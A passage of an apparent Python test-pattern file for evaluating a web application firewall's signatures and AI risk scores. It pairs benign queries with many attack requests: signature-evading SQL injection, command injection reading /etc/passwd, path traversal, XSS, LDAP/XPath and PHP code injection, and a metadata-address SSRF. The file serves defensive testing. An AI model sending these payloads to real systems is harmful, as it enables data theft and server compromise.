            note="Command exec with quote-break + $IFS to dodge 'cat /etc/passwd' signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_path_double_enc","GET","/rest/products/search",
            {"q":"apple..%252f..%252f..%252fetc%252fpasswd"},
            note="Path traversal double-URL-encoded (%252f) to dodge ../ signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_sqli_hex","GET","/rest/products/search",
            {"q":"apple' OR 0x61=0x61-- "},
            note="SQLi with hex literals (0x61=0x61) instead of '1'='1'. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_sqli_concat","GET","/rest/products/search",
            {"q":"apple' OR 'a'||'b'='ab"},
            note="SQLi with string concat (||) to dodge OR/= signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_sqli_inline","GET","/rest/products/search",
            {"q":"apple'/*!50000UNION*/SELECT 1,2--"},
            note="SQLi with MySQL /*!50000...*/ inline-comment keyword. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_xss_svg_animate","GET","/rest/products/search",
            {"q":"<svg><animate onbegin=alert(1) attributeName=x dur=1s>"},
            note="XSS via svg animate onbegin, no on-error/script. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_xss_details","GET","/rest/products/search",
            {"q":"<details open ontoggle=alert(1)>"},
            note="XSS via details ontoggle, uncommon handler. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_xss_entity","GET","/rest/products/search",
            {"q":"&#60;img src=x onerror=alert(1)&#62;"},
            note="XSS with HTML-entity-encoded angle brackets. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_cmd_subshell","GET","/rest/products/search",
            {"q":"apple;$(cat${IFS}/etc/passwd)"},
            note="Command exec via $(...) subshell + ${IFS}. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_cmd_wildcard","GET","/rest/products/search",
            {"q":"apple;/bin/c?t /e??/passwd"},
            note="Command exec with glob wildcards (c?t, /e??/) to dodge literal match. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_path_dotfill","GET","/rest/products/search",
            {"q":"apple....//....//....//etc/passwd"},
            note="Path traversal with ....// filler to dodge ../ signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_path_backslash","GET","/rest/products/search",
            {"q":"apple..\\..\\..\\etc\\passwd"},
            note="Path traversal with backslashes instead of forward slashes. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),

    Pattern("attack","ev_med_case","GET","/Server-Info",
            note="Predictable-resource recon, case-varied path to dodge /server-info signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_med_trailing","GET","/server-info/.",
            note="Predictable-resource recon, trailing /. to dodge exact-path signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_med_enc_char","GET","/server-inf%6f",
            note="Predictable-resource recon, final 'o' percent-encoded (%6f). Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_med_dotseg","GET","/./cgi-bin/",
            note="Predictable-resource recon, /./ prefix segment to dodge /cgi-bin/ signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_med_dslash","GET","//cgi-bin//",
            note="Predictable-resource recon, doubled slashes to dodge /cgi-bin/ signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_med_upper","GET","/CGI-BIN/",
            note="Predictable-resource recon, full-upper /CGI-BIN/ to dodge case-sensitive signature. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_med_enc_dot","GET","/cgi-bin/%2e",
            note="Predictable-resource recon, encoded dot (%2e) suffix. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_med_semi","GET","/server-info;x=1",
            note="Predictable-resource recon, matrix-param ;x=1 appended. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_med_dotslash","GET","/cgi-bin/./",
            note="Predictable-resource recon, /./ suffix segment. Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
    Pattern("attack","ev_med_enc_slash","GET","/cgi-bin%2f",
            note="Predictable-resource recon, trailing slash encoded (%2f). Read event: sig match + req_risk.",
            kind="sig_probe",risk="evade"),
]
FRONTIER = [


    Pattern("attack","fr_hdr_sqli_select","GET","/api/Products",
            headers={"Authorization":"Bearer '; SELECT * FROM Users--"},
            note="F5 demo: SQLi breaks out of Bearer token concat. Expected req_risk=high, blocked. Read event.",
            kind="sig_probe",risk="high"),
    Pattern("attack","fr_hdr_sqli_union","GET","/api/Products",
            headers={"Authorization":"Bearer ' UNION SELECT NULL,NULL,NULL--"},
            note="F5 demo: UNION SQLi in Bearer header. Expected req_risk=high, blocked. Read event.",
            kind="sig_probe",risk="high"),
    Pattern("attack","fr_hdr_sqli_drop","GET","/api/Products",
            headers={"Authorization":"Bearer '; DROP TABLE Users--"},
            note="F5 demo: stacked DROP in Bearer header. Expected req_risk=high, blocked. Read event.",
            kind="sig_probe",risk="high"),
    Pattern("attack","fr_hdr_sqli_or","GET","/api/Products",
            headers={"Authorization":"Bearer ' OR 1=1--"},
            note="F5 demo: boolean SQLi in Bearer header. Expected req_risk=high, blocked. Read event.",
            kind="sig_probe",risk="high"),
    Pattern("benign","fr_nlp_select_drop","GET","/rest/products/search",
            {"q":"Can you show me how to SELECT data and DROP a table?"},
            note="F5 demo: SQL keywords inside a natural-language question. Low-accuracy sig may fire; expected req_risk=low, AI override allow. Read event.",
            kind="sig_probe",risk="low"),
    Pattern("benign","fr_nlp_tokens","GET","/rest/products/search",
            {"q":"SELECT tokens > 500 or tokens > ethereum and IS NOT NULL"},
            note="F5 demo: natural-language programming prompt mimicking attack vectors. Expected req_risk=low, allowed. Read event.",
            kind="sig_probe",risk="low"),
]
LOWACC = [


    Pattern("attack","la_or_aa","GET","/api/Products",
            headers={"Authorization":"Bearer ' OR 'a'='a"},
            note="Weak boolean SQLi, no High-risk keyword. Expect low-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
    Pattern("attack","la_or_1hash","GET","/api/Products",
            headers={"Authorization":"Bearer ' OR 1=1#"},
            note="Boolean SQLi with # comment. Expect low-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
    Pattern("attack","la_admin_comment","GET","/api/Products",
            headers={"Authorization":"Bearer admin'--"},
            note="Classic auth-bypass fragment, weak. Expect low-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
    Pattern("attack","la_and_true","GET","/api/Products",
            headers={"Authorization":"Bearer 1' AND '1'='1"},
            note="AND-true tautology, no keyword. Expect low-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
    Pattern("attack","la_isnotnull","GET","/api/Products",
            headers={"Authorization":"Bearer ' OR username IS NOT NULL--"},
            note="IS NOT NULL predicate, natural-ish. Expect low-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
    Pattern("attack","la_select_only","GET","/api/Products",
            headers={"Authorization":"Bearer '; SELECT name FROM products--"},
            note="SELECT-only, no DROP/UNION. Expect low-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
    Pattern("attack","la_concat_sub","GET","/api/Products",
            headers={"Authorization":"Bearer '||(SELECT 1)||'"},
            note="Concat subselect, subtle. Expect low-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
    Pattern("attack","la_sleep","GET","/api/Products",
            headers={"Authorization":"Bearer 1' AND SLEEP(1)-- "},
            note="Time-based, single predicate. Expect low-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
    Pattern("attack","la_nl_tokens","GET","/api/Products",
            headers={"Authorization":"Bearer token WHERE user=1 OR 1=1"},
            note="SQL-ish natural phrase in token. Expect low-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
    Pattern("attack","la_convert_ver","GET","/api/Products",
            headers={"Authorization":"Bearer x' AND 1=CONVERT(int,@@version)--"},
            note="Error-based CONVERT, medium-subtle. Expect low/medium-accuracy sig + AI numeric score.",kind="sig_probe",risk="low"),
]
COMBO = [


    Pattern("attack","cb_multi_hdr_1","GET","/api/Products",
            headers={"Authorization":"Bearer ' OR 'a'='a",
                     "Referer":"https://x/?id=admin'--",
                     "X-Forwarded-For":"1' AND '1'='1"},
            note="3 weak SQLi across Authorization/Referer/XFF. Expect correlated indicators + AI numeric score.",
            kind="sig_probe",risk="medium"),
    Pattern("attack","cb_hdr_and_q","GET","/api/Products",
            {"q":"apple' OR 1=1#"},
            headers={"Authorization":"Bearer ' OR username IS NOT NULL--",
                     "Cookie":"sid='||(SELECT 1)||'"},
            note="Weak SQLi in q param + Authorization + Cookie. Expect correlated indicators + AI numeric score.",
            kind="sig_probe",risk="medium"),
    Pattern("attack","cb_four_sig","GET","/api/Products",
            {"q":"token WHERE user=1 OR 1=1"},
            headers={"Authorization":"Bearer '; SELECT name FROM products--",
                     "Referer":"https://x/?u=admin'--",
                     "X-Forwarded-For":"1' AND '1'='1"},
            note="4 weak SQLi indicators (q + 3 headers). Expect strong correlation + higher AI numeric score.",
            kind="sig_probe",risk="high"),
    Pattern("attack","cb_mixed_class","GET","/api/Products",
            {"q":"apple' OR 'a'='a"},
            headers={"Authorization":"Bearer ' OR 1=1#",
                     "Referer":"https://x/?p=../../etc/",
                     "User-Agent":"Mozilla/5.0 <img src=x onerror=1>"},
            note="Mixed weak SQLi + path + XSS indicators across surfaces. Expect multi-category correlation + AI score.",
            kind="sig_probe",risk="high"),
    Pattern("attack","cb_all_headers","GET","/api/Products",
            headers={"Authorization":"Bearer ' OR 'a'='a",
                     "Referer":"https://x/?id=' OR 1=1#",
                     "X-Forwarded-For":"admin'--",
                     "Cookie":"sid=1' AND '1'='1",
                     "X-Api-Token":"'||(SELECT 1)||'"},
            note="5 weak SQLi headers stacked. Expect max correlation of low-accuracy indicators + AI numeric score.",
            kind="sig_probe",risk="high"),
]
LOWSIG = [

    Pattern("attack","ls_union","GET","/rest/products/search",{"q":"UNION SELECT"},note="bare UNION SELECT keyword.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_select_from","GET","/rest/products/search",{"q":"SELECT * FROM users"},note="bare SELECT FROM.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_version","GET","/rest/products/search",{"q":"@@version"},note="bare @@version token.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_concat","GET","/rest/products/search",{"q":"concat(user,0x3a,password)"},note="concat() enumeration.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_infoschema","GET","/rest/products/search",{"q":"information_schema.tables"},note="information_schema reference.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_benchmark","GET","/rest/products/search",{"q":"benchmark(5000000,md5(1))"},note="benchmark() timing fn.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_waitfor","GET","/rest/products/search",{"q":"waitfor delay '0:0:5'"},note="waitfor delay keyword.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_script","GET","/rest/products/search",{"q":"<script"},note="bare <script fragment.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_js_scheme","GET","/rest/products/search",{"q":"javascript:alert"},note="javascript: scheme keyword.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_doc_cookie","GET","/rest/products/search",{"q":"document.cookie"},note="document.cookie reference.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_bin_bash","GET","/rest/products/search",{"q":"/bin/bash"},note="/bin/bash path keyword.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_cmd_exe","GET","/rest/products/search",{"q":"cmd.exe"},note="cmd.exe keyword.",kind="sig_probe",risk="low"),
    Pattern("attack","ls_etc_passwd","GET","/rest/products/search",{"q":"etc/passwd"},note="bare etc/passwd (no ../).",kind="sig_probe",risk="low"),
    Pattern("attack","ls_dotdot","GET","/rest/products/search",{"q":"../"},note="single ../ fragment.",kind="sig_probe",risk="low"),
]
NLSQL = [

    Pattern("benign","nl_select_drop","GET","/rest/products/search",{"q":"Can you show me how to SELECT data and DROP a table?"},note="F5 demo benign NL-SQL prompt.",kind="sig_probe",risk="low"),
    Pattern("benign","nl_tokens","GET","/rest/products/search",{"q":"SELECT tokens > 500 or tokens > ethereum and IS NOT NULL"},note="F5 demo NL programming prompt.",kind="sig_probe",risk="low"),
    Pattern("benign","nl_insert","GET","/rest/products/search",{"q":"I want to update my profile and insert a new address"},note="UPDATE/INSERT in plain sentence.",kind="sig_probe",risk="low"),
    Pattern("benign","nl_orderby","GET","/rest/products/search",{"q":"please order by date and group by category"},note="ORDER BY/GROUP BY in plain sentence.",kind="sig_probe",risk="low"),
    Pattern("benign","nl_union","GET","/rest/products/search",{"q":"the union of both selections looks great to select from"},note="union/select words in NL.",kind="sig_probe",risk="low"),
    Pattern("benign","nl_delete_where","GET","/rest/products/search",{"q":"delete my account where my email matches the one on file"},note="DELETE/WHERE in plain sentence.",kind="sig_probe",risk="low"),
    Pattern("benign","nl_having_count","GET","/rest/products/search",{"q":"show items having count greater than 5 and null values"},note="HAVING/COUNT/NULL in NL.",kind="sig_probe",risk="low"),
    Pattern("benign","nl_join","GET","/rest/products/search",{"q":"can you join the two tables and declare a variable"},note="JOIN/DECLARE words in NL.",kind="sig_probe",risk="low"),
]
MIX = [

    Pattern("attack","mix_1","GET","/rest/products/search",
            {"q":"the union of selections, order by date, group by name, having count greater than 5"},
            headers={"Authorization":"Bearer '; DROP TABLE Users--"},
            note="4 low NL-SQL keywords in q + 1 high (DROP TABLE header). Read event: accuracies + Risk Score.",
            kind="sig_probe",risk="high"),
    Pattern("attack","mix_2","GET","/rest/products/search",
            {"q":"please select and join the tables, then declare a variable and delete where matched"},
            headers={"Authorization":"Bearer ' UNION SELECT NULL,NULL,NULL--"},
            note="4 low NL-SQL keywords in q + 1 high (UNION SELECT header). Read event: accuracies + Risk Score.",
            kind="sig_probe",risk="high"),
    Pattern("attack","mix_3","GET","/rest/products/search",
            {"q":"update my insert, group by region, order by count, union of results"},
            headers={"Authorization":"Bearer admin' OR 1=1; DROP TABLE x--"},
            note="4 low NL-SQL keywords in q + 1 high (stacked DROP header). Read event: accuracies + Risk Score.",
            kind="sig_probe",risk="high"),
]
LOWLOW = [

    Pattern("attack","ll_sql_version","GET","/rest/products/search",{"q":"VERSION()"},note="targets sig 200102154 SQL-INJ VERSION() — acc=Low risk=Low.",kind="sig_probe",risk="low"),
    Pattern("attack","ll_sql_or","GET","/rest/products/search",{"q":"a' OR 'b"},note="targets sig 200102092 SQL-INJ ' OR ' — acc=Low risk=Low.",kind="sig_probe",risk="low"),
    Pattern("attack","ll_nosql_where","GET","/rest/products/search",{"q":"$where: 1"},note="targets sig 200002956 NoSQL-INJ $where — acc=Low risk=Low.",kind="sig_probe",risk="low"),
    Pattern("attack","ll_xss_marquee","GET","/rest/products/search",{"q":"<marquee>"},note="targets sig 200101872 XSS marquee tag — acc=Low risk=Low.",kind="sig_probe",risk="low"),
    Pattern("attack","ll_xss_entity","GET","/rest/products/search",{"q":"&#x41;"},note="targets sig 200001174 XSS HTML entity &#x — acc=Low risk=Low.",kind="sig_probe",risk="low"),
    Pattern("attack","ll_cmd_ifs","GET","/rest/products/search",{"q":"$IFS"},note="targets sig 200003995 Unix var $IFS — acc=Low risk=Low.",kind="sig_probe",risk="low"),
    Pattern("attack","ll_cmd_more","GET","/rest/products/search",{"q":";more config"},note="targets sig 200003088 Unix 'more' exec — acc=Low risk=Low.",kind="sig_probe",risk="low"),
    Pattern("attack","ll_ssci_echo","GET","/rest/products/search",{"q":"echo(123)"},note="targets sig 200104921 PHP echo injection — acc=Low risk=Low.",kind="sig_probe",risk="low"),
    Pattern("attack","ll_path_dotdot","GET","/rest/products/search",{"q":"../../"},note="targets sig 200000190 Path Traversal ../../ — acc=Low risk=Low.",kind="sig_probe",risk="low"),
]
BENIGN_BULK = [

    *[Pattern("normal", f"search_{w}", "GET", "/rest/products/search", {"q": w})
      for w in ["apple","juice","banana","cherry","lemon","soap","eggfruit","carrot","melon","orange",
                 "coffee","green tea","cola","sticker","shirt","mug","honey","wasp","owasp","fruit press",
                 "best juice","apple pomace","banana juice","quince","raspberry"]],
    *[Pattern("normal", f"product_{i}", "GET", f"/api/Products/{i}") for i in range(1,13)],
    *[Pattern("normal", f"reviews_{i}", "GET", f"/rest/products/{i}/reviews") for i in range(1,9)],
    Pattern("normal","product_list","GET","/api/Products"),
    Pattern("normal","app_version","GET","/rest/admin/application-version"),
    Pattern("normal","index","GET","/"),
    Pattern("normal","feedbacks_list","GET","/api/Feedbacks"),
    Pattern("normal","quantities","GET","/api/Quantitys"),
    Pattern("normal","languages","GET","/rest/languages"),
    Pattern("normal","chatbot_status","GET","/rest/chatbot/status"),
    Pattern("normal","captcha","GET","/rest/captcha"),
    Pattern("normal","main_js","GET","/main.js"),
    Pattern("normal","runtime_js","GET","/runtime.js"),
    Pattern("normal","favicon","GET","/favicon_js.ico"),
]
MUTI = [


    Pattern("attack","muti_sqli_or","GET","/index.php",{"page":"user-info.php","username":"admin' OR '1'='1","password":"x","user-info-php-submit-button":"View Account Details"},note="SQLi auth bypass (username).",kind="sig_probe",risk="high"),
    Pattern("attack","muti_sqli_union","GET","/index.php",{"page":"user-info.php","username":"' UNION SELECT 1,username,password,4,5,6,7 FROM accounts-- -","password":"x","user-info-php-submit-button":"View Account Details"},note="UNION SQLi credential dump (VERIFIED: dumps accounts user/pass on origin).",kind="sig_probe",risk="high"),
    Pattern("attack","muti_sqli_pass","GET","/index.php",{"page":"user-info.php","username":"admin","password":"' OR '1'='1","user-info-php-submit-button":"View Account Details"},note="SQLi via password param.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_sqli_sleep","GET","/index.php",{"page":"user-info.php","username":"admin' AND SLEEP(5)-- ","password":"x","user-info-php-submit-button":"View Account Details"},note="Time-based SQLi.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_sqli_stacked","GET","/index.php",{"page":"user-info.php","username":"x';DROP TABLE accounts--","password":"x","user-info-php-submit-button":"View Account Details"},note="Stacked DROP SQLi.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_sqli_poll","GET","/index.php",{"page":"user-poll.php","choice":"nmap","initials":"' OR 1=1--","user-poll-php-submit-button":"Submit Vote"},note="SQLi via user-poll initials.",kind="sig_probe",risk="high"),

    Pattern("attack","muti_cmd_semi","GET","/index.php",{"page":"dns-lookup.php","target_host":"127.0.0.1;cat /etc/passwd","dns-lookup-php-submit-button":"Lookup DNS"},note="Command injection ; cat passwd.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_cmd_pipe","GET","/index.php",{"page":"dns-lookup.php","target_host":"127.0.0.1|id","dns-lookup-php-submit-button":"Lookup DNS"},note="Command injection pipe id.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_cmd_amp","GET","/index.php",{"page":"dns-lookup.php","target_host":"127.0.0.1&&whoami","dns-lookup-php-submit-button":"Lookup DNS"},note="Command injection && whoami.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_cmd_backtick","GET","/index.php",{"page":"dns-lookup.php","target_host":"127.0.0.1`id`","dns-lookup-php-submit-button":"Lookup DNS"},note="Command injection backtick.",kind="sig_probe",risk="high"),

    Pattern("attack","muti_lfi_page","GET","/index.php",{"page":"../../../../../../etc/passwd"},note="LFI via page param.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_lfi_enc","GET","/index.php",{"page":"..%2f..%2f..%2f..%2fetc%2fpasswd"},note="Encoded traversal via page.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_lfi_textfile","GET","/index.php",{"page":"text-file-viewer.php","textfile":"/etc/passwd","text-file-viewer-php-submit-button":"View File"},note="Path traversal via textfile.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_rfi","GET","/index.php",{"page":"http://169.254.169.254/latest/meta-data/"},note="RFI/SSRF via page param.",kind="sig_probe",risk="high"),

    Pattern("attack","muti_xss_page","GET","/index.php",{"page":"<script>alert(1)</script>"},note="Reflected XSS via page.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_xss_user","GET","/index.php",{"page":"user-info.php","username":"<img src=x onerror=alert(1)>","password":"x","user-info-php-submit-button":"View Account Details"},note="XSS via username.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_xss_svg","GET","/index.php",{"page":"user-poll.php","choice":"nmap","initials":"<svg/onload=alert(1)>","user-poll-php-submit-button":"Submit Vote"},note="XSS via poll initials.",kind="sig_probe",risk="high"),

    Pattern("attack","muti_ldap","GET","/index.php",{"page":"user-info.php","username":"*)(uid=*))(|(uid=*","password":"x","user-info-php-submit-button":"View Account Details"},note="LDAP injection.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_xpath","GET","/index.php",{"page":"user-info.php","username":"' or count(/*)=1 or 'a'='a","password":"x","user-info-php-submit-button":"View Account Details"},note="XPath injection.",kind="sig_probe",risk="high"),
    Pattern("attack","muti_ssci_php","GET","/index.php",{"page":"user-info.php","username":"<?php system('id');?>","password":"x","user-info-php-submit-button":"View Account Details"},note="PHP server-side code injection.",kind="sig_probe",risk="high"),
]
MUTI_BENIGN = [
    *[Pattern("normal", f"m_page_{p.split('.')[0].replace('-','_')}", "GET", "/index.php", {"page": p})
      for p in ["home.php","login.php","register.php","user-info.php","user-poll.php","dns-lookup.php",
                 "text-file-viewer.php","credits.php","source-viewer.php","password-generator.php",
                 "pen-test-tool-lookup.php","notes.php","browser-info.php","usage-instructions.php",
                 "html5-storage.php","capture-data.php","set-background-color.php","add-to-your-blog.php",
                 "view-someones-blog.php","secret-administrative-pages.php","site-footer-xss-discussion.php",
                 "documentation/vulnerabilities.php","show-log.php","phpmyadmin-bug.php","installation-instructions.php"]],
    Pattern("normal","m_user_normal","GET","/index.php",{"page":"user-info.php","username":"john","password":"monkey","user-info-php-submit-button":"View Account Details"},note="normal login attempt."),
    Pattern("normal","m_user_guest","GET","/index.php",{"page":"user-info.php","username":"guest","password":"guest","user-info-php-submit-button":"View Account Details"},note="normal login attempt."),
    Pattern("normal","m_dns_good","GET","/index.php",{"page":"dns-lookup.php","target_host":"example.com","dns-lookup-php-submit-button":"Lookup DNS"},note="legit DNS lookup."),
    Pattern("normal","m_dns_google","GET","/index.php",{"page":"dns-lookup.php","target_host":"google.com","dns-lookup-php-submit-button":"Lookup DNS"},note="legit DNS lookup."),
    Pattern("normal","m_textfile_good","GET","/index.php",{"page":"text-file-viewer.php","textfile":"https://www.owasp.org","text-file-viewer-php-submit-button":"View File"},note="legit file view."),
    Pattern("normal","m_poll_good","GET","/index.php",{"page":"user-poll.php","choice":"nmap","initials":"AB","user-poll-php-submit-button":"Submit Vote"},note="legit poll vote."),
    Pattern("normal","m_index","GET","/index.php"),
    Pattern("normal","m_root","GET","/"),
    Pattern("normal","m_robots","GET","/robots.txt"),
    Pattern("normal","m_favicon","GET","/favicon.ico"),
    Pattern("normal","m_styles","GET","/styles/global-styles.css"),
]
STEALTH = [


    Pattern("attack","st_auth_version","GET","/index.php",{"page":"home.php"},
            headers={"Authorization":"Bearer ' OR VERSION()>'0"},note="Header SQLi VERSION() (low-acc sig 200102155).",kind="sig_probe",risk="high"),
    Pattern("attack","st_auth_comment","GET","/index.php",{"page":"home.php"},
            headers={"Authorization":"Bearer admin'-- "},note="Header SQLi ' -- comment (low-acc sig 200102210).",kind="sig_probe",risk="high"),
    Pattern("attack","st_auth_or","GET","/index.php",{"page":"home.php"},
            headers={"Authorization":"Bearer ' OR '1'='1"},note="Header SQLi ' OR ' (low-acc).",kind="sig_probe",risk="high"),
    Pattern("attack","st_auth_concat","GET","/index.php",{"page":"home.php"},
            headers={"Authorization":"Bearer '||VERSION()||'"},note="Header SQLi concat+VERSION() (low-acc).",kind="sig_probe",risk="high"),
    Pattern("attack","st_auth_isnull","GET","/index.php",{"page":"home.php"},
            headers={"Authorization":"Bearer ' OR username IS NOT NULL-- "},note="Header SQLi IS NOT NULL (low-acc).",kind="sig_probe",risk="high"),
    Pattern("attack","st_auth_hashcomment","GET","/index.php",{"page":"home.php"},
            headers={"Authorization":"Bearer ' OR 1=1#"},note="Header SQLi # comment (low-acc).",kind="sig_probe",risk="high"),
    Pattern("attack","st_cookie_version","GET","/index.php",{"page":"home.php"},
            headers={"Cookie":"sid=' OR VERSION()=VERSION()-- "},note="Cookie SQLi VERSION() (low-acc).",kind="sig_probe",risk="high"),
    Pattern("attack","st_cookie_or","GET","/index.php",{"page":"home.php"},
            headers={"Cookie":"token=admin' OR 'x'='x"},note="Cookie SQLi ' OR ' (low-acc).",kind="sig_probe",risk="high"),
    Pattern("attack","st_xff_or","GET","/index.php",{"page":"home.php"},
            headers={"X-Forwarded-For":"' OR 1=1-- "},note="XFF SQLi boolean (low-acc).",kind="sig_probe",risk="high"),
    Pattern("attack","st_xff_version","GET","/index.php",{"page":"home.php"},
            headers={"X-Forwarded-For":"1' AND VERSION()>'0"},note="XFF SQLi VERSION() (low-acc).",kind="sig_probe",risk="high"),
    Pattern("attack","st_ref_or","GET","/index.php",{"page":"home.php"},
            headers={"Referer":"https://x/?q=' OR 'a'='a"},note="Referer SQLi ' OR ' (low-acc).",kind="sig_probe",risk="high"),
    Pattern("attack","st_ua_or","GET","/index.php",{"page":"home.php"},
            headers={"User-Agent":"Mozilla/5.0 ' OR '1'='1"},note="User-Agent SQLi ' OR ' (low-acc).",kind="sig_probe",risk="high"),
]
FP_DEMO = [


    Pattern("benign","fp_nl_select_drop","GET","/index.php",{"page":"home.php","search":"Can you show me how to SELECT data and DROP a table?"},note="NL question with SQL words (F5 demo).",kind="sig_probe",risk="low"),
    Pattern("benign","fp_nl_tokens","GET","/index.php",{"page":"home.php","search":"SELECT tokens > 500 or tokens > ethereum and IS NOT NULL"},note="NL programming prompt.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_version_doc","GET","/index.php",{"page":"home.php","search":"how to call VERSION() in MySQL tutorial"},note="legit DB doc search w/ VERSION().",kind="sig_probe",risk="low"),
    Pattern("benign","fp_orderby","GET","/index.php",{"page":"home.php","search":"please order by date and group by category"},note="ORDER BY/GROUP BY in sentence.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_union_word","GET","/index.php",{"page":"home.php","search":"the european union select committee report"},note="union/select as English words.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_delete_where","GET","/index.php",{"page":"home.php","search":"delete my account where my email matches"},note="DELETE/WHERE in sentence.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_marquee_q","GET","/index.php",{"page":"home.php","search":"does the old <marquee> tag still work in html"},note="legit question mentioning marquee.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_entity_q","GET","/index.php",{"page":"home.php","search":"what does the &#x41; HTML entity mean"},note="legit question about HTML entity.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_path_q","GET","/index.php",{"page":"home.php","search":"the link ../manual.pdf returns 404"},note="legit broken-link report with ../.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_ifs_q","GET","/index.php",{"page":"home.php","search":"what is the $IFS variable in bash"},note="legit shell question mentioning $IFS.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_echo_q","GET","/index.php",{"page":"home.php","search":"how to use echo(123) in php"},note="legit php question mentioning echo.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_or_quote","GET","/index.php",{"page":"home.php","search":"error shown was name' OR '1'='1 in the box"},note="bug report quoting a SQLi error string.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_concat_q","GET","/index.php",{"page":"home.php","search":"how do I concat(first,last) two columns"},note="legit SQL how-to with concat().",kind="sig_probe",risk="low"),
    Pattern("benign","fp_where_q","GET","/index.php",{"page":"home.php","search":"use $where operator in mongodb query"},note="legit NoSQL doc search.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_having_q","GET","/index.php",{"page":"home.php","search":"show items having count greater than 5"},note="HAVING/COUNT in sentence.",kind="sig_probe",risk="low"),
    Pattern("benign","fp_join_q","GET","/index.php",{"page":"home.php","search":"can you join the two tables and declare a variable"},note="JOIN/DECLARE in sentence.",kind="sig_probe",risk="low"),
]
FAKE_MED = [

    Pattern("benign","fm_fetch","GET","/index.php",{"page":"home.php","search":"how to use fetch() in javascript"},note="sig 200101799 fetch() Medium.",kind="sig_probe",risk="medium"),
    Pattern("benign","fm_alert","GET","/index.php",{"page":"home.php","search":"what does alert(1) do in javascript"},note="sig 200101560 alert(1) Medium.",kind="sig_probe",risk="medium"),
    Pattern("benign","fm_console","GET","/index.php",{"page":"home.php","search":"console.info vs console.log difference"},note="sig 200101426 console.info Medium.",kind="sig_probe",risk="medium"),
    Pattern("benign","fm_textarea","GET","/index.php",{"page":"home.php","search":"the <textarea> tag wraps user text"},note="sig 200001414 textarea tag Medium.",kind="sig_probe",risk="medium"),
    Pattern("benign","fm_base64","GET","/index.php",{"page":"home.php","search":"embed an image as data: base64 in css"},note="sig 200001312 data: base64 Medium.",kind="sig_probe",risk="medium"),
    Pattern("benign","fm_groupby","GET","/index.php",{"page":"home.php","search":"sql group by clause tutorial"},note="sig 200002870 GROUP BY Medium.",kind="sig_probe",risk="medium"),
    Pattern("benign","fm_sleep","GET","/index.php",{"page":"home.php","search":"mysql sleep() function documentation"},note="sig 200002841 sleep() Medium.",kind="sig_probe",risk="medium"),
    Pattern("benign","fm_strcmp","GET","/index.php",{"page":"home.php","search":"how does strcmp work in php"},note="sig 200002852 strcmp Medium.",kind="sig_probe",risk="medium"),
